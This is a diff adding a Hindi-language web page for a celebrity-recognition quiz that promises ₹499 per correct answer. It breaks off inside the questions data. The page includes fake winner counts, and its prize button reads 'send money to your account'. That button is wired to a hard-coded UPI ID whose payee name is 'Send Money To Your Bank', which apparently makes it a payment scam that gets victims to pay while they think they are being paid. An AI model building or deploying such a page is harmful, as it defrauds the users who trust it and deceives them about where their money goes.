@@ -1,0 +1,1565 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    
+<!-- Google Tag Manager -->
+<script>
+(function(w,d,s,l,i){
+w[l]=w[l]||[];
+w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});
+var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';
+j.async=true;
+j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;
+f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-5ZBT73C5');
+</script>
+<!-- End Google Tag Manager -->
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>सेलिब्रिटी पहचानो • जीतो इनाम</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary: #7c3aed;
+      --primary-dark: #4c1d95;
+      --primary-light: #a855f7;
+      --gold: #f59e0b;
+      --gold-light: #fde047;
+      --success: #16a34a;
+      --danger: #dc2626;
+      --bg: #0f0720;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+    body {
+      font-family: 'Poppins', system-ui, sans-serif;
+      background: radial-gradient(circle at top, #2e1065 0%, #0f0720 65%, #070312 100%);
+      min-height: 100vh;
+      min-height: 100svh;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 0;
+      color: #1f2937;
+      overflow-x: hidden;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+
+    .app {
+      width: 100%;
+      max-width: 520px;
+      min-height: 100vh;
+      min-height: 100svh;
+      background: linear-gradient(180deg, #ffffff 0%, #faf5ff 100%);
+      border-radius: 0;
+      overflow: hidden;
+      box-shadow: 0 25px 70px rgba(124, 58, 237, 0.45), 0 0 0 1px rgba(255, 215, 0, 0.25);
+      position: relative;
+      display: flex;
+      flex-direction: column;
+    }
+
+    @media (min-width: 600px) {
+      body { padding: 20px; }
+      .app {
+        border-radius: 30px;
+        min-height: auto;
+      }
+    }
+
+    /* ========== HEADER ========== */
+    .header {
+      background: linear-gradient(135deg, #2e1065 0%, #5b21b6 45%, #7c3aed 80%, #9333ea 100%);
+      padding: 18px 16px 26px;
+      color: white;
+      position: relative;
+      overflow: hidden;
+      border-bottom: 2px solid rgba(253, 224, 71, 0.35);
+    }
+    .header::before {
+      content: '';
+      position: absolute;
+      width: 220px; height: 220px;
+      background: radial-gradient(circle, rgba(253, 224, 71, 0.22) 0%, transparent 70%);
+      top: -80px; left: -50px;
+      pointer-events: none;
+    }
+    .header::after {
+      content: '';
+      position: absolute;
+      width: 180px; height: 180px;
+      background: rgba(255,255,255,0.07);
+      border-radius: 50%;
+      top: -60px; right: -40px;
+      pointer-events: none;
+    }
+
+    .header-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 8px;
+      position: relative;
+      z-index: 2;
+    }
+    .header-left { display: flex; align-items: center; gap: 10px; }
+
+    /* Premium SVG Crown/Trophy Logo */
+    .brand-logo {
+      width: 44px;
+      height: 44px;
+      border-radius: 14px;
+      background: linear-gradient(135deg, #fde047 0%, #f59e0b 55%, #d97706 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 6px 16px rgba(245, 158, 11, 0.45), inset 0 1px 2px rgba(255,255,255,0.7);
+      flex-shrink: 0;
+      animation: floatLogo 3s ease-in-out infinite;
+    }
+    @keyframes floatLogo {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-3px); }
+    }
+
+    .header-title {
+      font-size: 16.5px;
+      font-weight: 800;
+      line-height: 1.25;
+      text-shadow: 0 2px 6px rgba(0,0,0,0.25);
+    }
+    .vip-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+      background: rgba(253, 224, 71, 0.18);
+      border: 1px solid rgba(253, 224, 71, 0.45);
+      color: #fde047;
+      font-size: 9.5px;
+      font-weight: 700;
+      padding: 2px 7px;
+      border-radius: 20px;
+      letter-spacing: 0.4px;
+      margin-bottom: 3px;
+    }
+
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .prize-pill-top {
+      background: linear-gradient(135deg, rgba(253,224,71,0.25), rgba(245,158,11,0.25));
+      border: 1px solid rgba(253, 224, 71, 0.5);
+      padding: 5px 10px;
+      border-radius: 14px;
+      text-align: right;
+      font-size: 11px;
+      font-weight: 700;
+      line-height: 1.25;
+      color: #fef08a;
+    }
+
+    /* Stats */
+    .stats-bar {
+      display: flex;
+      background: white;
+      border-radius: 20px;
+      padding: 11px 6px;
+      box-shadow: 0 10px 28px rgba(79, 40, 217, 0.16);
+      margin: -16px 14px 0;
+      position: relative;
+      z-index: 5;
+      border: 1px solid #f3e8ff;
+    }
+    .stat {
+      flex: 1;
+      text-align: center;
+      border-right: 1px solid #f3e8ff;
+      padding: 0 2px;
+    }
+    .stat:last-child { border-right: none; }
+    .stat-icon { font-size: 16px; margin-bottom: 1px; }
+    .stat-label { font-size: 8px; color: #6b7280; font-weight: 600; }
+    .stat-value { font-size: 14px; font-weight: 800; color: #5b21b6; }
+    .stat-value.gold { color: #d97706; }
+
+    /* ========== CONTENT ========== */
+    .content { padding: 16px 14px 20px; flex: 1; }
+
+    .progress-wrap {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      margin-bottom: 10px;
+    }
+    .progress-bar {
+      flex: 1;
+      height: 9px;
+      background: #ede9fe;
+      border-radius: 20px;
+      overflow: hidden;
+      box-shadow: inset 0 1px 3px rgba(0,0,0,0.08);
+    }
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #7c3aed, #c084fc, #f59e0b);
+      border-radius: 20px;
+      transition: width 0.45s cubic-bezier(0.34, 1.56, 0.64, 1);
+      width: 0%;
+    }
+    .score-pill {
+      background: linear-gradient(135deg, #fef3c7, #fde68a);
+      color: #92400e;
+      border: 1px solid #fcd34d;
+      font-size: 12.5px;
+      font-weight: 800;
+      padding: 4px 11px;
+      border-radius: 20px;
+      white-space: nowrap;
+    }
+
+    /* 7 Lifelines Bar */
+    .lives-bar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: #fff1f2;
+      border: 1px solid #fecdd3;
+      border-radius: 16px;
+      padding: 7px 12px;
+      margin-bottom: 14px;
+      transition: all 0.3s ease;
+    }
+    .lives-bar.shake {
+      animation: shake 0.45s ease;
+    }
+    .lives-label {
+      font-size: 11px;
+      font-weight: 700;
+      color: #be123c;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+    .lives-hearts {
+      font-size: 14.5px;
+      letter-spacing: 2px;
+    }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      20% { transform: translateX(-5px); }
+      40% { transform: translateX(5px); }
+      60% { transform: translateX(-4px); }
+      80% { transform: translateX(4px); }
+    }
+
+    /* Question Card */
+    .question-card {
+      background: linear-gradient(135deg, #4c1d95 0%, #6d28d9 50%, #7c3aed 100%);
+      color: white;
+      border-radius: 22px;
+      padding: 16px 16px 18px;
+      margin-bottom: 16px;
+      box-shadow: 0 10px 26px rgba(109, 40, 217, 0.32);
+      position: relative;
+      overflow: hidden;
+      border: 1px solid rgba(253, 224, 71, 0.3);
+      animation: cardSlide 0.4s ease;
+    }
+    @keyframes cardSlide {
+      from { opacity: 0; transform: translateY(10px) scale(0.98); }
+      to { opacity: 1; transform: translateY(0) scale(1); }
+    }
+    .question-card::after {
+      content: '';
+      position: absolute;
+      right: -25px; bottom: -25px;
+      width: 110px; height: 110px;
+      background: rgba(255,255,255,0.06);
+      border-radius: 50%;
+      pointer-events: none;
+    }
+
+    .q-meta-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 12px;
+    }
+    .q-badge {
+      background: rgba(255, 255, 255, 0.18);
+      border: 1px solid rgba(255,255,255,0.28);
+      color: #fde047;
+      font-size: 12px;
+      font-weight: 700;
+      padding: 4px 12px;
+      border-radius: 20px;
+    }
+    .timer-box {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      background: #ffffff;
+      color: #4c1d95;
+      padding: 4px 11px 4px 6px;
+      border-radius: 50px;
+      box-shadow: 0 4px 14px rgba(0,0,0,0.22);
+      border: 1.5px solid rgba(253, 224, 71, 0.75);
+      transition: all 0.25s ease;
+    }
+    .clock-ring {
+      position: relative;
+      width: 28px;
+      height: 28px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+    .clock-ring svg {
+      width: 28px;
+      height: 28px;
+      transform: rotate(-90deg);
+    }
+    .clock-bg {
+      fill: #f3e8ff;
+      stroke: #e9d5ff;
+      stroke-width: 3;
+    }
+    .clock-progress {
+      fill: none;
+      stroke: #7c3aed;
+      stroke-width: 3;
+      stroke-linecap: round;
+      stroke-dasharray: 75.4;
+      stroke-dashoffset: 0;
+      transition: stroke-dashoffset 0.95s linear, stroke 0.3s ease;
+    }
+    .clock-needle {
+      position: absolute;
+      width: 2px;
+      height: 9px;
+      background: #dc2626;
+      border-radius: 2px;
+      top: 5px;
+      left: 50%;
+      transform-origin: bottom center;
+      transform: translateX(-50%) rotate(0deg);
+      transition: transform 0.2s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+    .clock-dot {
+      position: absolute;
+      width: 4px;
+      height: 4px;
+      background: #4c1d95;
+      border-radius: 50%;
+    }
+    .timer-text {
+      font-size: 13.5px;
+      font-weight: 900;
+      font-variant-numeric: tabular-nums;
+      letter-spacing: 0.3px;
+      color: #4c1d95;
+    }
+    .timer-box.tick-beat {
+      transform: scale(1.06);
+    }
+    .timer-box.warning {
+      border-color: #f97316;
+      background: #fff7ed;
+    }
+    .timer-box.warning .timer-text { color: #ea580c; }
+    .timer-box.warning .clock-progress { stroke: #f97316; }
+
+    .timer-box.danger {
+      border-color: #ef4444;
+      background: #fef2f2;
+      animation: dangerPulse 0.5s ease-in-out infinite;
+    }
+    .timer-box.danger .timer-text { color: #dc2626; }
+    .timer-box.danger .clock-progress { stroke: #dc2626; }
+
+    @keyframes dangerPulse {
+      0%, 100% { transform: scale(1); box-shadow: 0 4px 12px rgba(220, 38, 38, 0.25); }
+      50% { transform: scale(1.09); box-shadow: 0 6px 18px rgba(220, 38, 38, 0.55); }
+    }
+
+
+    .celeb-photo-box {
+      position: relative;
+      width: 100%;
+      aspect-ratio: 16/11;
+      margin: 0 auto 12px;
+      border-radius: 16px;
+      overflow: hidden;
+      border: 2px solid rgba(253, 224, 71, 0.65);
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.35);
+      background: #2e1065;
+    }
+    .celeb-photo-box img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      object-position: top center;
+      display: block;
+      filter: blur(2.2px) brightness(0.98);
+      transform: scale(1.03);
+      transition: filter 0.5s ease, transform 0.5s ease;
+    }
+    .celeb-photo-box.revealed img {
+      filter: blur(0px) brightness(1);
+      transform: scale(1);
+    }
+    .blur-badge {
+      position: absolute;
+      bottom: 8px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(15, 7, 32, 0.78);
+      color: #fde047;
+      font-size: 9.5px;
+      font-weight: 700;
+      padding: 2px 9px;
+      border-radius: 20px;
+      white-space: nowrap;
+      border: 1px solid rgba(253, 224, 71, 0.4);
+      transition: opacity 0.35s ease;
+    }
+    .celeb-photo-box.revealed .blur-badge {
+      opacity: 0;
+    }
+
+    .question-text {
+      font-size: 16.5px;
+      font-weight: 700;
+      text-align: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      line-height: 1.4;
+    }
+    .question-hint {
+      margin-top: 8px;
+      text-align: center;
+      font-size: 12px;
+      color: #e9d5ff;
+      background: rgba(0,0,0,0.18);
+      padding: 5px 12px;
+      border-radius: 12px;
+      font-weight: 500;
+    }
+
+    /* Options */
+    .options {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 11px;
+      margin-bottom: 16px;
+    }
+    .option {
+      background-color: #ffffff;
+      border: 2px solid #e9d5ff;
+      border-radius: 18px;
+      padding: 13px 10px;
+      font-size: 13.5px;
+      font-weight: 700;
+      color: #2e1065;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 9px;
+      transition: all 0.22s cubic-bezier(0.4, 0, 0.2, 1);
+      text-align: left;
+      user-select: none;
+      box-shadow: 0 3px 10px rgba(124, 58, 237, 0.06);
+      animation: optionIn 0.35s ease backwards;
+    }
+    .option span:not(.opt-letter) {
+      color: inherit;
+    }
+    .option:nth-child(1) { animation-delay: 0.04s; }
+    .option:nth-child(2) { animation-delay: 0.09s; }
+    .option:nth-child(3) { animation-delay: 0.14s; }
+    .option:nth-child(4) { animation-delay: 0.19s; }
+    @keyframes optionIn {
+      from { opacity: 0; transform: translateY(12px) scale(0.96); }
+      to { opacity: 1; transform: translateY(0) scale(1); }
+    }
+
+    .option:active { transform: scale(0.96); }
+    .option:hover:not(.disabled) {
+      border-color: #a855f7;
+      background-color: #faf5ff;
+      transform: translateY(-2px);
+      box-shadow: 0 8px 18px rgba(124, 58, 237, 0.15);
+    }
+    .option.selected,
+    .option.selected:hover {
+      background: linear-gradient(135deg, #4c1d95 0%, #7c3aed 100%);
+      background-color: #5b21b6;
+      color: #ffffff;
+      border-color: #f59e0b;
+      box-shadow: 0 8px 20px rgba(91, 33, 182, 0.42);
+    }
+    .option.selected span:not(.opt-letter) {
+      color: #ffffff;
+    }
+    .option.correct {
+      background: linear-gradient(135deg, #15803d, #22c55e);
+      background-color: #16a34a;
+      color: #ffffff;
+      border-color: #bbf7d0;
+      animation: pop 0.35s ease;
+    }
+    .option.correct span:not(.opt-letter) {
+      color: #ffffff;
+    }
+    .option.wrong {
+      background: linear-gradient(135deg, #b91c1c, #ef4444);
+      background-color: #dc2626;
+      color: #ffffff;
+      border-color: #fecaca;
+    }
+    .option.wrong span:not(.opt-letter) {
+      color: #ffffff;
+    }
+    .option.disabled { pointer-events: none; opacity: 0.9; }
+
+    .opt-letter {
+      width: 28px; height: 28px;
+      background: linear-gradient(135deg, #7c3aed, #a855f7);
+      color: #ffffff;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      font-weight: 800;
+      flex-shrink: 0;
+    }
+    .option.selected .opt-letter,
+    .option.correct .opt-letter,
+    .option.wrong .opt-letter {
+      background: rgba(255,255,255,0.28);
+      color: #ffffff;
+    }
+
+    @keyframes pop {
+      0% { transform: scale(1); }
+      40% { transform: scale(1.06); }
+      100% { transform: scale(1); }
+    }
+
+    /* Lock button */
+    .lock-btn {
+      width: 100%;
+      background: linear-gradient(90deg, #5b21b6, #7c3aed, #9333ea);
+      color: white;
+      border: none;
+      border-radius: 50px;
+      padding: 15px;
+      font-size: 15.5px;
+      font-weight: 800;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      box-shadow: 0 10px 24px rgba(91, 33, 182, 0.38);
+      transition: all 0.25s ease;
+      letter-spacing: 0.3px;
+    }
+    .lock-btn:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 14px 30px rgba(91, 33, 182, 0.48);
+    }
+    .lock-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    /* Result feedback */
+    .result {
+      display: none;
+      text-align: center;
+      padding: 14px 12px;
+      margin-top: 14px;
+      border-radius: 18px;
+      font-weight: 700;
+      font-size: 14.5px;
+      animation: slideUp 0.35s ease;
+    }
+    .result.show { display: block; }
+    .result.correct {
+      background: linear-gradient(135deg, #dcfce7, #bbf7d0);
+      color: #166534;
+      border: 1px solid #86efac;
+    }
+    .result.wrong {
+      background: linear-gradient(135deg, #fee2e2, #fecaca);
+      color: #991b1b;
+      border: 1px solid #fca5a5;
+    }
+
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(12px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* Bottom bar */
+    .bottom-bar {
+      display: flex;
+      justify-content: space-around;
+      padding: 14px 7px 18px;
+      background: linear-gradient(180deg, #faf5ff, #f3e8ff);
+      border-top: 1px solid #e9d5ff;
+      margin-top: auto;
+    }
+    .bottom-item { text-align: center; }
+    .bottom-icon { font-size: 20px; margin-bottom: 1px; }
+    .bottom-value { font-size: 13.5px; font-weight: 800; color: #5b21b6; }
+    .bottom-label { font-size: 10px; color: #6b7280; font-weight: 600; line-height: 1.2; }
+
+    /* ========== FINAL SCREEN ========== */
+    .final-screen {
+      display: none;
+      padding: 32px 20px 40px;
+      text-align: center;
+      animation: slideUp 0.4s ease;
+      flex: 1;
+    }
+    .final-screen.show { display: block; }
+    .final-emoji { font-size: 66px; margin-bottom: 10px; }
+    .final-title { font-size: 25px; font-weight: 900; color: #4c1d95; margin-bottom: 6px; }
+    .final-score { font-size: 50px; font-weight: 900; color: #7c3aed; margin: 8px 0; }
+    .final-earned {
+      display: inline-block;
+      background: linear-gradient(135deg, #fef3c7, #fde68a);
+      border: 1.5px solid #f59e0b;
+      color: #92400e;
+      font-size: 16px;
+      font-weight: 800;
+      padding: 8px 20px;
+      border-radius: 50px;
+      margin-bottom: 14px;
+    }
+    .final-sub { color: #6b7280; font-size: 14px; margin-bottom: 24px; line-height: 1.5; }
+    .restart-btn {
+      background: linear-gradient(90deg, #5b21b6, #9333ea);
+      color: white;
+      border: none;
+      border-radius: 50px;
+      padding: 15px 38px;
+      font-size: 16px;
+      font-weight: 800;
+      cursor: pointer;
+      box-shadow: 0 10px 26px rgba(91, 33, 182, 0.38);
+    }
+
+    /* Confetti canvas */
+    #confetti {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      pointer-events: none;
+      z-index: 250;
+    }
+
+    /* Toast */
+    .toast {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%) translateY(70px);
+      background: #1e1b4b;
+      color: #fde047;
+      border: 1px solid rgba(253, 224, 71, 0.4);
+      padding: 8px 20px;
+      border-radius: 50px;
+      font-size: 13px;
+      font-weight: 700;
+      opacity: 0;
+      transition: all 0.35s ease;
+      z-index: 300;
+      white-space: nowrap;
+    }
+    .toast.show {
+      transform: translateX(-50%) translateY(0);
+      opacity: 1;
+    }
+
+    @media (max-width: 380px) {
+      .header-title { font-size: 15px; }
+      .option { font-size: 12.5px; padding: 11px 8px; }
+      .lives-hearts { font-size: 13px; letter-spacing: 1px; }
+    }
+
+    /* ========== SUCCESS MODAL & BIG-SMALL BREATHING BUTTON ========== */
+    .success-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(15, 7, 32, 0.72);
+      z-index: 200;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      backdrop-filter: blur(6px);
+    }
+    .success-overlay.show {
+      display: flex;
+      animation: fadeIn 0.25s ease;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    .success-card {
+      background: linear-gradient(180deg, #ffffff 0%, #faf5ff 100%);
+      border-radius: 28px;
+      padding: 28px 22px 26px;
+      width: min(100%, 355px);
+      max-width: 355px;
+      text-align: center;
+      border: 2px solid rgba(245, 158, 11, 0.45);
+      box-shadow: 0 30px 80px rgba(79, 40, 217, 0.45), 0 0 30px rgba(245, 158, 11, 0.25);
+      animation: modalBounceIn 0.45s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+    @keyframes modalBounceIn {
+      0% { opacity: 0; transform: scale(0.65) translateY(30px); }
+      70% { opacity: 1; transform: scale(1.03) translateY(-4px); }
+      100% { opacity: 1; transform: scale(1) translateY(0); }
+    }
+    .success-trophy {
+      font-size: 56px;
+      margin-bottom: 6px;
+      filter: drop-shadow(0 6px 12px rgba(234, 179, 8, 0.45));
+      animation: trophyWobble 1.6s ease-in-out infinite;
+    }
+    @keyframes trophyWobble {
+      0%, 100% { transform: rotate(0deg) scale(1); }
+      25% { transform: rotate(-7deg) scale(1.06); }
+      75% { transform: rotate(7deg) scale(1.06); }
+    }
+    .success-title {
+      font-size: 19px;
+      font-weight: 800;
+      color: #4c1d95;
+      margin-bottom: 4px;
+      line-height: 1.3;
+    }
+    .success-amount {
+      font-size: 46px;
+      font-weight: 900;
+      background: linear-gradient(135deg, #16a34a, #15803d);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin: 4px 0 4px;
+      letter-spacing: -1px;
+    }
+    .success-correct {
+      font-size: 13.5px;
+      color: #4b5563;
+      margin-bottom: 18px;
+      background: #f3e8ff;
+      display: inline-block;
+      padding: 4px 14px;
+      border-radius: 20px;
+    }
+
+    /* Chhota-Bada (Zoom In / Zoom Out) Popup Button */
+    .success-next-btn {
+      width: 100%;
+      background: linear-gradient(135deg, #16a34a 0%, #22c55e 50%, #15803d 100%);
+      color: white;
+      border: 2px solid #bbf7d0;
+      border-radius: 50px;
+      padding: 16px 18px;
+      font-size: 16px;
+      font-weight: 800;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      position: relative;
+      overflow: hidden;
+      text-shadow: 0 1px 3px rgba(0,0,0,0.25);
+      animation: chhotaBadaBtn 1.15s ease-in-out infinite;
+    }
+    @keyframes chhotaBadaBtn {
+      0%, 100% {
+        transform: scale(0.93);
+        box-shadow: 0 6px 18px rgba(22, 163, 74, 0.4);
+      }
+      50% {
+        transform: scale(1.06);
+        box-shadow: 0 14px 32px rgba(22, 163, 74, 0.72), 0 0 0 8px rgba(34, 197, 94, 0.22);
+      }
+    }
+    .success-next-btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 65%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.55), transparent);
+      animation: shineMove 1.8s ease-in-out infinite;
+    }
+    @keyframes shineMove {
+      0% { left: -100%; }
+      55%, 100% { left: 135%; }
+    }
+    .success-next-btn:active {
+      animation: none;
+      transform: scale(0.95);
+    }
+
+    @media print {
+      body { display: none !important; }
+    }
+  </style>
+</head>
+<body>
+  <canvas id="confetti"></canvas>
+  <div class="toast" id="toast"></div>
+
+  <!-- SUCCESS POPUP -->
+  <div class="success-overlay" id="successOverlay">
+    <div class="success-card">
+      <div class="success-trophy">🏆</div>
+      <div class="success-title">शानदार! आपने सही पहचान लिया</div>
+      <div class="success-amount" id="successAmountText">₹499</div>
+      <div class="success-correct">सही जवाब: <strong id="successCorrectName">—</strong></div>
+      <button class="success-next-btn" onclick="payAndNext()">💰 पैसे अपने खाते में भेजें</button>
+    </div>
+  </div>
+
+  <div class="app" id="app">
+    <!-- HEADER -->
+    <div class="header">
+      <div class="header-top">
+        <div class="header-left">
+          <div class="brand-logo" aria-hidden="true">
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="none">
+              <path d="M3 7L7.5 11.5L12 5L16.5 11.5L21 7L19 18H5L3 7Z" fill="#4C1D95" stroke="#4C1D95" stroke-width="1.6" stroke-linejoin="round"/>
+              <circle cx="12" cy="3" r="1.5" fill="#4C1D95"/>
+              <circle cx="3" cy="5.5" r="1.3" fill="#4C1D95"/>
+              <circle cx="21" cy="5.5" r="1.3" fill="#4C1D95"/>
+            </svg>
+          </div>
+          <div>
+            <div class="vip-tag">✨ VIP क्विज़ चैलेंज</div>
+            <div class="header-title">सेलिब्रिटी पहचानो<br>और जीतें इनाम!</div>
+          </div>
+        </div>
+        <div class="header-right">
+          <div class="prize-pill-top" id="headerPrizePill">
+            🎁 हर सही जवाब<br>₹499 जीतें!
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- STATS -->
+    <div class="stats-bar">
+      <div class="stat">
+        <div class="stat-icon">👥</div>
+        <div class="stat-label">आज के विजेता</div>
+        <div class="stat-value">12,846+</div>
+      </div>
+      <div class="stat">
+        <div class="stat-icon">💰</div>
+        <div class="stat-label">जीती राशि</div>
+        <div class="stat-value gold" id="walletDisplay">₹0</div>
+      </div>
+      <div class="stat">
+        <div class="stat-icon">⚡</div>
+        <div class="stat-label">आज का चैलेंज</div>
+        <div class="stat-value" id="challenge">1/7</div>
+      </div>
+    </div>
+
+    <!-- MAIN GAME -->
+    <div class="content" id="gameArea">
+      <div class="progress-wrap">
+        <div class="progress-bar">
+          <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <div class="score-pill">⭐ <span id="scoreDisplay">0</span>/7</div>
+      </div>
+
+      <!-- 7 LIFELINES BAR -->
+      <div class="lives-bar" id="livesBar">
+        <span class="lives-label">💖 लाइफलाइन (<span id="livesCount">7</span>/7)</span>
+        <span class="lives-hearts" id="livesPill">❤️❤️❤️❤️❤️❤️❤️</span>
+      </div>
+
+      <div class="question-card" id="questionCard">
+        <div class="q-meta-bar">
+          <span class="q-badge" id="qBadge">प्रश्न 1/7</span>
+          <div class="timer-box" id="timerBox">
+            <div class="clock-ring">
+              <svg viewBox="0 0 28 28">
+                <circle class="clock-bg" cx="14" cy="14" r="12"></circle>
+                <circle class="clock-progress" id="clockProgress" cx="14" cy="14" r="12"></circle>
+              </svg>
+              <div class="clock-needle" id="clockNeedle"></div>
+              <div class="clock-dot"></div>
+            </div>
+            <span class="timer-text" id="timer">00:15</span>
+          </div>
+        </div>
+        <div class="celeb-photo-box" id="celebPhotoBox">
+          <img id="celebImg" src="" alt="Celebrity Face">
+          <span class="blur-badge">🔍 पहचानें</span>
+        </div>
+        <div class="question-text">
+          <span>🤔</span>
+          <span>यह कौन सी सेलिब्रिटी हैं?</span>
+        </div>
+        <div class="question-hint" id="questionHint">संकेत: बॉलीवुड के 'किंग खान'</div>
+      </div>
+
+      <div class="options" id="options"></div>
+
+      <button class="lock-btn" id="lockBtn" disabled>
+        🔒 अपना जवाब लॉक करें
+      </button>
+
+      <div class="result" id="result"></div>
+    </div>
+
+    <!-- FINAL SCREEN -->
+    <div class="final-screen" id="finalScreen">
+      <div class="final-emoji" id="finalEmoji">🎉</div>
+      <div class="final-title" id="finalTitle">शानदार!</div>
+      <div class="final-score"><span id="finalScore">0</span>/7</div>
+      <div class="final-earned">कुल जीता इनाम: ₹<span id="finalMoney">0</span></div>
+      <div class="final-sub" id="finalSub">आपने सभी 7 प्रश्न पूरे किए!</div>
+      <button class="restart-btn" onclick="restartGame()">🔄 फिर से खेलें</button>
+    </div>
+
+    <!-- BOTTOM -->
+    <div class="bottom-bar" id="bottomBar">
+      <div class="bottom-item">
+        <div class="bottom-icon">🏆</div>
+        <div class="bottom-value" id="bottomPrizeValue">₹499</div>
+        <div class="bottom-label">प्रति प्रश्न इनाम</div>
+      </div>
+      <div class="bottom-item">
+        <div class="bottom-icon">⚡</div>
+        <div class="bottom-value">7</div>
+        <div class="bottom-label">रोमांचक प्रश्न</div>
+      </div>
+      <div class="bottom-item">
+        <div class="bottom-icon">💖</div>
+        <div class="bottom-value">7</div>
+        <div class="bottom-label">फुल लाइफलाइन</div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    /* =====================================================
+       🔧 EASY SETTINGS (defaults) — UPI ID / Payee / Amount
+       Yahan Amount badalne par poori site mein wahi amount sync hoga
+       ===================================================== */
+    const PAYMENT_UPI_ID     = 'paytm.s4288z3@pty';
+    const PAYMENT_PAYEE_NAME = 'Send Money To Your Bank';
+    const PAYMENT_AMOUNT     = 499;
+
+    function getUnitAmount() {
+      const parsed = parseFloat(PAYMENT_AMOUNT);
+      return Number.isFinite(parsed) && parsed > 0 ? Math.round(parsed) : 499;
+    }
+
+    function syncPaymentAmount() {
+      const unitAmt = getUnitAmount();
+      const formatted = `₹${unitAmt}`;
+
+      const successAmtEl = document.getElementById('successAmountText');
+      if (successAmtEl) successAmtEl.textContent = formatted;
+
+      const headerPillEl = document.getElementById('headerPrizePill');
+      if (headerPillEl) headerPillEl.innerHTML = `🎁 हर सही जवाब<br>${formatted} जीतें!`;
+
+      const bottomPrizeEl = document.getElementById('bottomPrizeValue');
+      if (bottomPrizeEl) bottomPrizeEl.textContent = formatted;
+    }
+
+    // ========== QUESTIONS DATA ==========
+    const questions = [
+      {
+        image: "https://commons.wikimedia.org/wiki/Special:FilePath/ShahrukhKhan.jpg",
+        hint: "संकेत: बॉलीवुड के 'किंग खान' और DDLJ के हीरो",
+        options: [
+          { id: "A", text: "शाहरुख खान" },
+          { id: "B", text: "सलमान खान" },
+          { id: "C", text: "आमिर खान" },
+          { id: "D", text: "ऋतिक रोशन" }
+        ],
+        correct: "A"
+      },
+      {
+        image: "https://commons.wikimedia.org/wiki/Special:FilePath/Salman%20Khan.jpg",
+        hint: "संकेत: बॉलीवुड के 'भाईजान' और Bigg Boss के होस्ट",
+        options: [
+          { id: "A", text: "अक्षय कुमार" },
+          { id: "B", text: "सलमान खान" },
+          { id: "C", text: "शाहरुख खान" },
+          { id: "D", text: "अमिताभ बच्चन" }
+        ],
+        correct: "B"
+      },
+      {
+        image: "https://commons.wikimedia.org/wiki/Special:FilePath/Official%20Photograph%20of%20Prime%20Minister%20Narendra%20Modi%20Portrait.png",
+        hint: "संकेत: भारत के माननीय प्रधानमंत्री",
+        options: [
+          { id: "A", text: "योगी आदित्यनाथ" },
+          { id: "B", text: "राहुल गांधी" },
+          { id: "C", text: "अमित शाह" },
+          { id: "D", text: "नरेंद्र मोदी" }
+        ],
+        correct: "D"
+      },
+      {
+        image: "https://commons.wikimedia.org/wiki/Special:FilePath/AkshayKumar.jpg",
+        hint: "संकेत: बॉलीवुड के 'खिलाड़ी कुमार'",
+        options: [
